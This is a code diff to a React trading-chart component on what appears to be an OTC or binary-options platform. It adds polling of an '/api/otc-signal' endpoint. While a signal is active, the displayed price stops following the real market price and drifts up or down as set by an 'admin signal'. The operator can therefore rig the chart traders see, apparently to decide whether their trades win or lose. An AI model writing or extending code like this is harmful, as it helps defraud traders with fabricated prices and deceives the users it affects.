@@ -720,6 +720,7 @@ export default function TradeChart({ tab, activeTrades, onPriceChange, expiryMs,
   const lastPrice    = useRef(0);
   const lastTime     = useRef(0);
   const realPriceRef   = useRef(0); // latest price from API, micro-tick drifts toward this
+  const signalRef      = useRef<{ direction: "up" | "down"; strength: number } | null>(null);
   const activeKeyRef   = useRef(""); // tracks current tab.id+tf — stale async ops check this
   const pendingPt      = useRef<{ x: number; y: number; time: number; price: number } | null>(null);
   const freehandRef    = useRef<{ id: string; points: { time: number; price: number }[] } | null>(null);
@@ -1284,6 +1285,28 @@ export default function TradeChart({ tab, activeTrades, onPriceChange, expiryMs,
     }
   }, [tab.id]);
 
+  /* ── OTC signal polling — fetch active signal every 2s ──────────── */
+  useEffect(() => {
+    const isOTC = tab.id.includes("OTC");
+    if (!isOTC) { signalRef.current = null; return; }
+
+    let dead = false;
+    const poll = async () => {
+      try {
+        const r = await fetch(`/api/otc-signal?assetId=${encodeURIComponent(tab.id)}`);
+        if (dead) return;
+        const d = await r.json();
+        const s = d.signal;
+        signalRef.current = (s && s.expiresAt > Date.now())
+          ? { direction: s.direction, strength: s.strength }
+          : null;
+      } catch { /* ignore */ }
+    };
+    poll();
+    const iv = setInterval(poll, 2000);
+    return () => { dead = true; clearInterval(iv); signalRef.current = null; };
+  }, [tab.id]);
+
   /* ── micro-tick every 100ms for fluid movement ───────────────────── */
   useEffect(() => {
     const period = TF_SEC[tf] ?? 60;
@@ -1294,12 +1317,22 @@ export default function TradeChart({ tab, activeTrades, onPriceChange, expiryMs,
       if (!series || !list.length || !lastPrice.current) return;
 
       const current = lastPrice.current;
-      const real    = realPriceRef.current || current; // don't drift if real not loaded yet
+      const real    = realPriceRef.current || current;
+      const signal  = signalRef.current;
 
-      // Drift strongly toward real price, minimal noise just for visual smoothness
-      const drift = (real - current) * 0.25;
-      const noise = current * (Math.random() - 0.5) * 0.000008;
-      const p     = +(current + drift + noise).toFixed(5);
+      let drift: number;
+      let noise: number;
+      if (signal) {
+        // Directional drift controlled by admin signal
+        const dir = signal.direction === "up" ? 1 : -1;
+        drift = current * 0.000015 * dir * signal.strength;
+        noise = current * (Math.random() - 0.5) * 0.000003; // minimal noise
+      } else {
+        // Normal: drift toward real price
+        drift = (real - current) * 0.25;
+        noise = current * (Math.random() - 0.5) * 0.000008;
+      }
+      const p = +(current + drift + noise).toFixed(5);
 
       setUp(p >= lastPrice.current);
       lastPrice.current = p;
